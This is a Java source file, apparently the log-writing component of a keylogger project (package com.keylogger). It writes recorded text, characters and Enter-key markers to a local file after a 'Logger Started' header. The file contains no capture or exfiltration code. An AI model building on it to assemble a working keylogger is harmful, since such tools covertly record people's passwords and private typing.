package com.keylogger;

import java.io.*;

public class IOWrite implements IOOperations
{
	Writer writer = null;
	String fileName = null;
	
	public void initWriter(String fileName)
	{
		this.fileName = fileName;	
		try 
		{
			writer = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(fileName), "utf-8"));
			writer.write("Logger Started: ");
			writer.write(System.getProperty("line.separator"));
		} 
		catch (IOException e) {}
	}
	
	public void writeString(String content)
	{
		try 
		{
			writer.write(content);
		} 
		catch (IOException e) {}
	}

	public void closeWriter()
	{
		try {
			if(writer!=null)
			writer.close();
			writer=null;
		} catch (IOException e) {
		}
	}
	
	public void writeChar(int c){
		try {
			writer.write(c);
		} catch (IOException e) {}
	}
	
	public void writeEnter()
	{
		if(writer!=null)
			try {
				writer.write('\u21B2');
				writer.write(System.getProperty("line.separator"));
			} catch (IOException e) {}
	}

}
